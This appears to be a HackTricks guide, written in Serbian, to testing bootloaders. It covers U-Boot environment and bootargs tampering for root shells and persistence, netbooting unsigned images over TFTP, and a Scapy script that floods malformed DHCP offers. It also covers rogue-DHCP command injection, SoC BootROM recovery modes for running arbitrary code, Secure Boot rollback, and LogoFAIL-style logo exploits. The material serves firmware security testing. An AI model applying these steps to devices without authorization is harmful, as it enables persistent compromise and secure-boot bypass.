# Testiranje bootloadera

{{#include ../../banners/hacktricks-training.md}}

Sledeći koraci se preporučuju za modifikovanje konfiguracija pri pokretanju uređaja i testiranje bootloadera kao što su U-Boot i UEFI-klasni loaderi. Fokusirajte se na dobijanje ranog izvršenja koda, procenu zaštita potpisa/rollback-a i zloupotrebu recovery ili network-boot putanja.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot — brzi dobitci i zloupotreba okruženja

1. Pristup interpreter shell-u
- Tokom boot-a, pritisnite poznati break taster (često bilo koji taster, 0, space ili board-specifičnu "magic" sekvencu) pre nego što `bootcmd` izvrši komande, da biste ušli na U-Boot prompt.

2. Pregled stanja boot-a i promenljivih
- Korisne komande:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Izmena boot argumenata da dobijete root shell
- Dodajte `init=/bin/sh` kako bi kernel pao u shell umesto normalnog init-a:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot sa vašeg TFTP servera
- Konfigurišite mrežu i preuzmite kernel/fit image sa LAN-a:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persistencija izmena preko environment-a
- Ako skladište env-a nije write-protected, možete sačuvati kontrolu:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Proverite promenljive kao što su `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` koje utiču na fallback putanje. Neispravno konfigurisane vrednosti mogu omogućiti ponovljene prekide u shell.

6. Proverite debug/nesigurne funkcije
- Potražite: `bootdelay` > 0, `autoboot` onemogućen, neograničen `usb start; fatload usb 0:1 ...`, mogućnost `loady`/`loads` preko serijske, `env import` sa nepouzdane medije, i kerneli/ramdiski učitani bez provere potpisa.

7. Testiranje U-Boot image/verifikacije
- Ako platforma tvrdi secure/verified boot koristeći FIT images, pokušajte i sa unsigned i sa tampered image-ima:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Odsustvo `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ili legacy `verify=n` ponašanja često dozvoljava boot arbitrary payload-a.

## Network-boot površina (DHCP/PXE) i lažni serveri

8. PXE/DHCP parameter fuzzing
- Legacy BOOTP/DHCP implementacija u U-Boot-u je imala probleme sa bezbednošću memorije. Na primer, CVE‑2024‑42040 opisuje otkrivanje memorije preko crafted DHCP odgovora koji može leak-ovati bajtove iz U-Boot memorije nazad na mrežu. Testirajte DHCP/PXE kod sa predugačkim/edge-case vrednostima (option 67 bootfile-name, vendor options, file/servername fields) i posmatrajte za hang-ove/leak-ove.
- Minimalan Scapy snippet za stresiranje boot parametara tokom netboota:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Takođe proverite da li se PXE filename polja prosleđuju shell-u/loader logici bez sanitizacije kad se lančano koriste sa OS-side provisioning skriptama.

9. Testiranje command injection-a putem lažnog DHCP servera
- Postavite lažan DHCP/PXE servis i pokušajte ubaciti karaktere u filename ili options polja da biste dopreli do komandnih interpretatora u kasnijim fazama boot lanca. Metasploit’s DHCP auxiliary, `dnsmasq`, ili custom Scapy skripte su dobri alati. Prvo izolujte lab mrežu.

## SoC ROM recovery modovi koji nadjačavaju normalni boot

Mnogi SoC-ovi izlažu BootROM "loader" mod koji prihvata kod preko USB/UART čak i kada flash image-i nisu validni. Ako secure-boot fuses nisu spaljeni, ovo često omogućava arbitrary code execution veoma rano u lancu.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Procijenite da li uređaj ima secure-boot eFuses/OTP spaljene. Ako nisu, BootROM download modovi često zaobilaze bilo kakvu višeg-nivo verifikaciju (U-Boot, kernel, rootfs) izvršavajući vaš first-stage payload direktno iz SRAM/DRAM.

## UEFI/PC-class bootloaderi: brze provere

10. Manipulacija ESP-om i rollback testiranje
- Mount-ujte EFI System Partition (ESP) i proverite loader komponente: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo putanje.
- Pokušajte boot sa downgraded ili poznato ranjivim signed boot komponentama ako revokacije Secure Boot-a (dbx) nisu aktuelne. Ako platforma i dalje veruje starim shim-ovima/bootmanager-ima, često možete učitati sopstveni kernel ili `grub.cfg` sa ESP-a da biste dobili persistenciju.

11. Bugovi u parsiranju boot logo-a (LogoFAIL klasa)
- Nekoliko OEM/IBV firmvera je bilo ranjivo na image-parsing greške u DXE koje procesiraju boot logo-e. Ako napadač može postaviti crafted image na ESP pod vendor-specifičnu putanju (npr. `\EFI\<vendor>\logo\*.bmp`) i reboot-uje, moguć je code execution tokom ranog boot-a čak i sa Secure Boot omogućenim. Testirajte da li platforma prihvata user-supplied logo-e i da li su te putanje upisive iz OS-a.

## Hardverske mere opreza

Budite oprezni pri radu sa SPI/NAND flash-om tokom ranog boot-a (npr. uzemljivanje pinova da biste zaobišli čitanja) i uvek konsultujte datasheet flash-a. Neodgovarajuće tempirane kratke veze mogu korumpirati uređaj ili programmer.

## Beleške i dodatni saveti

- Pokušajte `env export -t ${loadaddr}` i `env import -t ${loadaddr}` za premještanje environment blob-ova između RAM-a i skladišta; neke platforme dozvoljavaju import env-a sa removable media bez autentikacije.
- Za persistenciju na Linux-based sistemima koji boot-uju preko `extlinux.conf`, izmena `APPEND` linije (da se ubaci `init=/bin/sh` ili `rd.break`) na boot particiji je često dovoljna kada nema provere potpisa.
- Ako userland pruža `fw_printenv/fw_setenv`, proverite da li `/etc/fw_env.config` odgovara realnom env skladištu. Pogrešno podešeni offset-i vam omogućavaju čitanje/pisanje pogrešnog MTD regiona.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
